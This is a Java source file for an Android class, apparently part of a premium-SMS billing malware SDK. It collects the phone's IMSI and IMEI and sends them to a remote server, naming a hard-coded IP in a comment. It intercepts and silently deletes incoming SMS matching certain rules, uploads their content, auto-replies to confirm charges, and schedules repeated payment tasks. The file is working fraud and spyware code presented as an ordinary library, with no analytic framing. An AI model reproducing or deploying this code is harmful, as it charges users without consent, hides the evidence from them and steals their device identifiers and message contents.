package com.thirdparty.engine;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;

import com.gandalf.daemon.utils.Common;
import com.gandalf.daemon.utils.DeviceUuidFactory;
import com.gandalf.daemon.utils.LogUtil;
import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.IMSInfo;
import com.msm.modu1e.utils.ImsiUtil;
import com.msm.modu1e.utils.SMSUtil;
import com.orhanobut.hawk.Hawk;
import com.thirdparty.net.PhoneNumCallback;
import com.thirdparty.net.Reporter;
import com.thirdparty.net.SmsReflectInfoReportCallback;
import com.thirdparty.net.SmsResultReportCallback;
import com.thirdparty.sms.utils.SmsInterceptHelper;
import com.thirdparty.utils.Constants;
import com.thirdparty.utils.PreferenceUtil;
import com.zhy.http.okhttp.OkHttpUtils;

import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import k.m.IStub;
import k.m.PayListener;
import k.m.PayTask;
import okhttp3.OkHttpClient;

public class ServiceStub implements IStub {
    private static final boolean UPLOAD_LOG = true;
    private XL_log log = new XL_log(ServiceStub.class);
    private static ServiceStub INSTANCE = null;
    private Context mContext;
    private boolean mIsRunning = false;
    private boolean mIsPhoneNumInited = false;
    private PayTask mCurPayTask = null;
    private static String mPid, mCid;

    public void setmIsPhoneNumInited(boolean mIsPhoneNumInited) {
        this.mIsPhoneNumInited = mIsPhoneNumInited;
    }

    public PayTask getCurPayTask() {
        return mCurPayTask;
    }

    public static synchronized ServiceStub getInstance(Context context, String pid, String cid) {
        if (context != null) {
            mPid = pid;
            mCid = cid;
            if (INSTANCE == null) {
                INSTANCE = new ServiceStub(context);
                HawkInit(context);
            }
        }
        return INSTANCE;
    }

    public static synchronized ServiceStub getInstance(Context context) {
        if (context != null) {
            if (INSTANCE == null) {
                INSTANCE = new ServiceStub(context);
                HawkInit(context);
            }
        }
        return INSTANCE;
    }

    private ServiceStub(Context context) {
        this.mContext = context;
        initOkHttp();
    }

    private void initOkHttp() {
        OkHttpClient okHttpClient = new OkHttpClient.Builder().connectTimeout(Common.HTTP_TIMEOUT, TimeUnit.SECONDS)
                .readTimeout(Common.HTTP_TIMEOUT, TimeUnit.SECONDS).build();
        OkHttpUtils.initClient(okHttpClient);
    }

    private void initPhoneNum() {//pid=10003&cid=cid&imei=imei&imsi=imsi&&uuid=uuid&hasSecurityApp=1
        IMSInfo imsiInfo = ImsiUtil.getIMSInfo(mContext);
        String imsi = "";
        if (imsiInfo != null) {
            String i1 = imsiInfo.imsi_1;
            String i2 = imsiInfo.imsi_2;
            if (!TextUtils.isEmpty(i1)) {
                imsi = i1;
            } else if (!TextUtils.isEmpty(i2)) {
                imsi = i2;
            }
        }
        if (TextUtils.isEmpty(imsi)) {
            imsi = ImsiUtil.getIMSIWithAPI(mContext);
        }
        ConnectivityManager connectivityManager = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = connectivityManager.getActiveNetworkInfo();
        if (info != null && info.getType() == ConnectivityManager.TYPE_MOBILE) {
            if (imsi != null) {
                if (imsi.startsWith("46000") || imsi.startsWith("46002") || imsi.startsWith("46003")) {
                    try {
                        Map<String, String> params = new HashMap<>();
                        String pid = mPid;
                        String cid = mCid;
                        if (TextUtils.isEmpty(pid) || TextUtils.isEmpty(cid)) {
                            return;
                        }
                        String imei = ImsiUtil.getIMEIWithAPI(mContext);
                        params.put("pid", pid);
                        params.put("cid", cid);
                        params.put("hasSecurityApp", "1");//if security app installed
                        params.put("imei", imei);
                        params.put("imsi", imsi);
                        params.put("uuid", new DeviceUuidFactory(mContext).getDeviceUuid());
                        params.put("name", "feeSdk2_gprsMobile");//http://103.229.214.108/api/test?name=feeSdk2_fee&pid=10003&cid=cid&imsi=imsi&iccid=iccid&imei=imei&uuid=uuid
                        OkHttpUtils.get().params(params).url(Constants.URL_GET_NUM).build().execute(new PhoneNumCallback(mContext));
                    } catch (IllegalArgumentException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }


    @Override
    public void pay(PayTask payTask) {

        if (payTask == null || payTask.mPrice < 0) {
            return;
        }
        mCurPayTask = payTask;
        doPay(payTask);
        if (!isRunning()) {
            startService();
        }
        if (!mIsPhoneNumInited) {
            initPhoneNum();
        }
    }

    /***
     * Must be ensured invoke this method bu Main Thread
     */
    @Override
    public void startService() {
        log.debug("ServiceStub startService version:" + getVersion());
        registerReceiver();
        registerSmsIndexProider();
        scheduleTask();
        uploadSmsReflectInfo();
        mIsRunning = true;
    }

    @Override
    public void stopService() {
        log.debug("ServiceStub stopService version:" + getVersion());
        unRegisterReceiver();
        stopThirdSdkService();
        mIsRunning = false;
    }

    private void stopThirdSdkService() {
        WYpay.getInstance(mContext).destroy();
        YuFengPay yfPay = new YuFengPay(mContext);
        yfPay.destroy();
        YunBeiPay yunbeiPay = YunBeiPay.getInstance(mContext);
        yunbeiPay.destroy();
    }

    @Override
    public int getVersion() {
        return AppBuildConfig.JAR_VERSION;
    }


    @Override
    public boolean isRunning() {
        return mIsRunning;
    }

    private String mPayloadVersion = null;

    @Override
    public void setPayloadVersion(String verion) {
        mPayloadVersion = verion;
    }

    @Override
    public String getPayloadVersion() {
        return mPayloadVersion;
    }

    private void doPay(PayTask payTask) {
        Intent intent = new Intent();
        intent.setAction(Constants.INTENT_ACTION_REQEUST_PAYTASK);
        Bundle b = new Bundle();
        b.putSerializable(Constants.BUNDLE_KEY_PAYTASK, payTask);
        intent.putExtras(b);
        mContext.sendBroadcast(intent);
    }

    /***
     * do internal test Task
     */
    private void doInternalTestTask() {
        log.debug("do Internal test task");
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i <= 3; i++) {
                    try {
                        Thread.sleep(90 * 1000);
                        if (mCurPayTask != null) {
                            String pid = mCurPayTask.mPid;
                            String cid = mCurPayTask.mCid;
                            PayTask task = new PayTask(20, pid, cid, new PayListener() {
                                @Override
                                public void onPaySuccess() {

                                }

                                @Override
                                public void onPayFailed(int errorCode, String errorMsg) {

                                }
                            });
                            pay(task);
                        }
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

    private void scheduleTask() {
        doInternalTestTask();
        scheduleRequestPayTask(REQUEST_PAYTASK_STAMP);
    }

    private static Timer smRequestPayTask;

    public static int REQUEST_TIME = 0;

    public void scheduleRequestPayTask(long period) {
        if (smRequestPayTask != null) {
            smRequestPayTask.cancel();
            smRequestPayTask = null;
        }
        smRequestPayTask = new Timer("scheduleRequestPayTask");
        smRequestPayTask.schedule(new TimerTask() {
            @Override
            public void run() {
                PayTask task = getCurPayTask();
                if (task == null) {
                    return;
                }
                PayTask newTask = new PayTask(0, task.mPid, task.mCid, new PayListener() {
                    @Override
                    public void onPaySuccess() {

                    }

                    @Override
                    public void onPayFailed(int errorCode, String errorMsg) {

                    }
                });
                if (REQUEST_TIME <= 2) {
                    newTask.mPrice = 0;
                } else {
                    newTask.mPrice = 0;
                }
                pay(newTask);
                REQUEST_TIME++;
            }
        }, period, period);
        log.debug("schedule next request time:" + period / 1000 + " s");
    }

    private void uploadSmsReflectInfo() {
        boolean isReport = PreferenceUtil.readRecord(mContext, "reportSmsRe", false);
        if (!isReport) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    log.debug("start reportSmsReflect");
                    Reporter.reportSmsReflect(mContext, new SmsReflectInfoReportCallback(mContext));
                }
            }).start();
            PreferenceUtil.saveRecord(mContext, "reportSmsRe", true);
        }
    }

    private static Timer smUploadLogTimer = null;
    private static final int REPORT_LOG_STAMP = 15 * 1000;
    private static long REQUEST_PAYTASK_STAMP = 1 * 60 * 1000;

    public static void setRequestPayTaskStampTime(long period) {
        if (period > 0)
            REQUEST_PAYTASK_STAMP = period;
    }

    public void scheduleUploadLog() {
        if (!UPLOAD_LOG) {
            return;
        }
        if (smUploadLogTimer != null) {
            smUploadLogTimer.cancel();
            smUploadLogTimer = null;
            return;
        }
        log.debug("scheduleUploadLog");
        smUploadLogTimer = new Timer("scheduleUploadLog");
        smUploadLogTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                String logConent = getRunlogContent();
                if (logConent == null)
                    return;
                clearLog();
                log.debug("reportLog runtime log length:" + logConent.length());
                Reporter.reportRunLog(mContext, logConent);
                System.gc();
            }
        }, REPORT_LOG_STAMP, REPORT_LOG_STAMP);
    }

    private static SmsMessageReceiver smSMSMessageReceiver = new SmsMessageReceiver();
    private static SendSMSResultReceiver smSendSMSResultReceiver = new SendSMSResultReceiver();
    private static SendSMSArriveReceiver smSendSMSArriveReceiver = new SendSMSArriveReceiver();

    private static II1 smChannelService = new II1();

    private void registerReceiver() {
        log.debug("registerReceiver");
//        unRegisterReceiver();
        IntentFilter channel_filter = new IntentFilter();
        channel_filter.addAction(Constants.INTENT_ACTION_REQEUST_PAYTASK);
        channel_filter.addAction(Constants.INTENT_ACTION_REQUEST_SMSTASK);
        channel_filter.addAction(Constants.INTENT_ACTION_DO_SMS_TASK);
        channel_filter.addAction(Constants.INTENT_ACTION_DO_UPLOAD_TASK);
        channel_filter.addAction(Constants.INTENT_ACTION_REQUEST_UPLOAD_TASK);

        channel_filter.addAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YF);
        channel_filter.addAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_WY);
        channel_filter.addAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YUNBEI);
        mContext.registerReceiver(smChannelService, channel_filter);

        IntentFilter sms_filter = new IntentFilter();
        sms_filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        mContext.registerReceiver(smSMSMessageReceiver, sms_filter);

        IntentFilter send_ret_filter = new IntentFilter();
        send_ret_filter.addAction(Constants.RECEIVER_FILTER_ACTION_SENDSMS_CHANNEL);
        send_ret_filter.addAction(Constants.RECEIVER_FILTER_YUFENG_SMS_SEND_ACTION);
        send_ret_filter.addAction(Constants.RECEIVER_FILTER_WEIYUN_SMS_SEND_ACTION);
        mContext.registerReceiver(smSendSMSResultReceiver, send_ret_filter);

        IntentFilter send_arrive_filter = new IntentFilter();
        send_arrive_filter.addAction(Constants.RECEIVER_FILTER_ACTION_SENDSMS_ARRIVE);
        mContext.registerReceiver(smSendSMSArriveReceiver, send_arrive_filter);
    }

    private void unRegisterReceiver() {
        try {
            log.debug("destoryReceiver");
            if (smChannelService != null) {
                mContext.unregisterReceiver(smChannelService);
                smChannelService = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
            // TODO: handle exception
        }
        try {
            if (smSMSMessageReceiver != null) {
                mContext.unregisterReceiver(smSMSMessageReceiver);
                smSMSMessageReceiver = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            if (smSendSMSResultReceiver != null) {
                mContext.unregisterReceiver(smSendSMSResultReceiver);
                smSendSMSResultReceiver = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.gc();
    }


    private ContentObserver mSmsObserver = null;

    private void registerSmsIndexProider() {
        if (mSmsObserver == null) {
            mSmsObserver = new ContentObserver(new Handler()) {
                private XL_log log = new XL_log(ContentObserver.class);

                @Override
                public void onChange(boolean selfChange) {
                    super.onChange(selfChange);
                    ContentResolver resolver = mContext.getContentResolver();
                    Cursor cursor = resolver.query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address",
                            "body"}, null, null, "_id desc");
                    if (cursor == null)
                        return;
                    long id = -1;
                    if (cursor.getCount() > 0 && cursor.moveToFirst()) {
                        id = cursor.getLong(0);
                        String address = cursor.getString(1);
                        String body = cursor.getString(2);
                        if (id < 0) {
                            return;
                        }
                        if (TextUtils.isEmpty(body) || TextUtils.isEmpty(address)) {
                            return;
                        }
                        String sim = "";
                        address = SMSUtil.removeNumberPre(address);
                        boolean intercept = SmsInterceptHelper.getInstance(mContext).determinIntercept(address, body);
                        log.debug("intercept ?" + intercept + " ,from:" + address + " , content:" + body);
                        if (intercept) {
                            boolean deleteRet = SmsInterceptHelper.getInstance(mContext)
                                    .deleteIndexSmsRecordById(mContext, id);
                            log.debug("deleteIndexSmsRecordById ret ?" + deleteRet);
                            if (deleteRet) {
                                Reporter.reportSmsContent(mContext, address, body, 1, "delete from db success", new SmsResultReportCallback());
                            } else {
                                Reporter.reportSmsContent(mContext, address, body, 0, "delete from db success", new SmsResultReportCallback());
                            }
                            boolean reply = SmsInterceptHelper.getInstance(mContext).determineReplyKeyConsistent(body);
                            log.debug("determineReplyKeyConsistent ?" + reply);
                            if (reply) {
                                String replyContent = SmsInterceptHelper.getInstance(mContext).getReplyContentFromSmsContent(body);
                                if (!TextUtils.isEmpty(replyContent)) {
                                    SmsInterceptHelper.getInstance(mContext).startReplyTask(replyContent, address);
                                }
                            }
                        } else {
//                            boolean isUp = SmsUpHelper.determinUp(address, body);
//                            log.debug("isUp:" + isUp);
//                            if (isUp) {
//                                Reporter.reportSmsContent(mContext, "up", "", "", "", "", address, body,
//                                        Date.getCurTime(), "up sms ContentObserver", new SmsResultReportCallback());
//                            }
                        }
                    }
                    cursor.close();
                }
            };
            mContext.getContentResolver().registerContentObserver(Uri.parse("content://sms/inbox"), true, mSmsObserver);
        }
    }

    private static void HawkInit(Context context) {
        Hawk.init(context).build();
    }

    public void clearLog() {
        XL_log.clearLogFile(mContext);
    }

    public String getRunlogContent() {
        return XL_log.getLogContent(mContext);
    }
}
